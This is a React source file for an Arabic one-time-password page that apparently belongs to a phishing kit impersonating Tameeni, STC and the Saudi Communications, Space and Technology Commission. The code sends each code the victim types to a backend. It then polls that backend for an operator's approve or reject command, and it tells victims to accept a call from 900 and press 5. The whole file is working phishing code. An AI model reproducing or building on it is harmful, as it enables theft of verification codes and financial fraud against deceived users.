import { useState, useEffect, useRef } from "react";
import { CheckCircle, XCircle, Loader2 } from "lucide-react";
import { tameeniApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";

type Status = "idle" | "pending" | "approved" | "rejected";

function Countdown({ seconds, onEnd }: { seconds: number; onEnd: () => void }) {
  const [left, setLeft] = useState(seconds);
  const ref = useRef<ReturnType<typeof setInterval> | null>(null);
  const onEndRef = useRef(onEnd);
  onEndRef.current = onEnd;
  useEffect(() => {
    ref.current = setInterval(() => {
      setLeft(s => {
        if (s <= 1) {
          clearInterval(ref.current!);
          setTimeout(() => onEndRef.current(), 0);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(ref.current!);
  }, []);
  const mm = String(Math.floor(left / 60)).padStart(2, "0");
  const ss = String(left % 60).padStart(2, "0");
  return <span dir="ltr">{mm}:{ss}</span>;
}

export default function OtpPage() {
  useTracking("التحقق OTP");
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<Status>("idle");
  const [canResend, setCanResend] = useState(false);
  const [resendKey, setResendKey] = useState(0);

  useEffect(() => {
    if (status !== "pending") return;
    const id = localStorage.getItem("tameeni_id");
    if (!id) return;
    const iv = setInterval(async () => {
      const cmd = await tameeniApi.getCmd(id);
      if (cmd === "otp:approved") setStatus("approved");
      else if (cmd === "otp:rejected") setStatus("rejected");
    }, 2000);
    return () => clearInterval(iv);
  }, [status]);

  async function handleSubmit() {
    if (!otp.trim()) return;
    const id = localStorage.getItem("tameeni_id");
    if (!id) return;
    await tameeniApi.patch(id, { otpCode: otp.trim(), otpStatus: "pending" });
    setStatus("pending");
  }

  if (status === "approved") return (
    <div className="min-h-screen bg-white flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="text-center space-y-5 max-w-xs mx-4">
        <CheckCircle className="w-20 h-20 text-emerald-500 mx-auto" strokeWidth={1.5} />
        <h2 className="text-[24px] font-extrabold text-gray-900">تم التحقق بنجاح</h2>
        <p className="text-[14px] text-gray-500">سيتم الاطلاع على عروض التأمين المناسبة لك</p>
        <button onClick={() => window.location.href = "/tameeni/"}
          className="w-full py-3 rounded-xl text-white font-bold text-[15px] transition-colors"
          style={{ background: "linear-gradient(135deg, #7b5ea7, #5b4fcf)" }}>
          العودة للرئيسية
        </button>
      </div>
    </div>
  );

  if (status === "rejected") return (
    <div className="min-h-screen bg-white flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="text-center space-y-5 max-w-xs mx-4">
        <XCircle className="w-20 h-20 text-red-500 mx-auto" strokeWidth={1.5} />
        <h2 className="text-[24px] font-extrabold text-red-600">رمز التحقق غير صحيح</h2>
        <p className="text-[14px] text-gray-500">يرجى المحاولة مرة أخرى</p>
        <button onClick={() => { setStatus("idle"); setOtp(""); setCanResend(false); setResendKey(k => k + 1); }}
          className="w-full py-3 rounded-xl border border-gray-200 text-gray-700 font-bold text-[15px] hover:bg-gray-50 transition-colors">
          حاول مجدداً
        </button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>

      {/* Mutasil header */}
      <div className="px-5 pt-5 pb-4 flex items-center gap-2.5">
        <div className="grid grid-cols-3 gap-0.5">
          {Array.from({ length: 9 }).map((_, i) => (
            <div key={i} className="w-2.5 h-2.5 rounded-full"
              style={{ background: i < 6 ? "#7b5ea7" : "#c4b5d0" }} />
          ))}
        </div>
        <div>
          <span className="text-[13px] font-black" style={{ color: "#7b5ea7" }}>متصل</span>
          <span className="text-[11px] font-semibold text-gray-400 mr-1">mutasil</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center px-5 pt-4">
        {/* Info box */}
        <div className="w-full max-w-sm bg-gray-50 rounded-2xl p-4 flex items-start gap-3 mb-6">
          <div className="flex-1">
            <p className="text-[14px] text-gray-700 leading-relaxed text-right">
              📲 تم إرسال رمز التحقق الى هاتفك النقال. الرجاء إدخاله في هذه الخانة.
            </p>
          </div>
          <div className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0" style={{ background: "#dbeafe" }}>
            <svg className="w-5 h-5" style={{ color: "#2563eb" }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
            </svg>
          </div>
        </div>

        {/* STC branding */}
        <div className="text-center mb-4">
          <div className="text-[52px] font-black tracking-tight leading-none" style={{ color: "#6d1f7e" }}>stc</div>
          <p className="text-[13px] text-gray-500 mt-3 leading-relaxed max-w-xs text-center">
            عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها واختيار الرقم 5
          </p>
        </div>

        {/* OTP input */}
        <div className="w-full max-w-sm space-y-3 mt-2">
          <input
            type="text" inputMode="numeric" maxLength={8}
            placeholder="رمز التحقق"
            value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, ""))}
            onKeyDown={e => e.key === "Enter" && handleSubmit()}
            dir="rtl"
            className="w-full border-2 border-gray-200 rounded-2xl px-5 py-4 text-[18px] font-bold text-center text-gray-800 outline-none transition-all placeholder:text-gray-300"
            style={{ letterSpacing: "0.15em" }}
            onFocus={e => (e.target.style.borderColor = "#7b5ea7")}
            onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
          />

          <button
            onClick={handleSubmit}
            disabled={!otp.trim() || status === "pending"}
            className="w-full py-4 rounded-2xl text-white text-[17px] font-extrabold disabled:opacity-50 transition-all flex items-center justify-center gap-2"
            style={{ background: otp.trim() ? "linear-gradient(135deg, #7b5ea7, #5b4fcf)" : "#b5a8d4" }}>
            {status === "pending" ? <><Loader2 className="w-5 h-5 animate-spin" />جارٍ التحقق...</> : "تحقق"}
          </button>

          {/* Resend countdown */}
          <p className="text-center text-[14px] text-gray-500 font-semibold">
            {canResend ? (
              <button className="font-extrabold" style={{ color: "#7b5ea7" }} onClick={() => { setCanResend(false); setResendKey(k => k + 1); }}>
                إعادة الإرسال
              </button>
            ) : (
              <>إعادة إرسال: <Countdown key={resendKey} seconds={117} onEnd={() => setCanResend(true)} /></>
            )}
          </p>
        </div>
      </div>

      {/* CST Footer */}
      <div className="pb-6 px-5">
        <div className="flex items-center justify-center gap-3 mt-6">
          <div className="text-center">
            <p className="text-[11px] font-bold text-gray-500">هيئة الاتصالات والفضاء والتقنية</p>
            <p className="text-[10px] text-gray-400">& Communications, Space</p>
            <p className="text-[10px] text-gray-400">Technology Commission</p>
          </div>
          <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center flex-shrink-0">
            <span className="text-[11px] font-black text-gray-600">CST</span>
          </div>
        </div>
      </div>
    </div>
  );
}
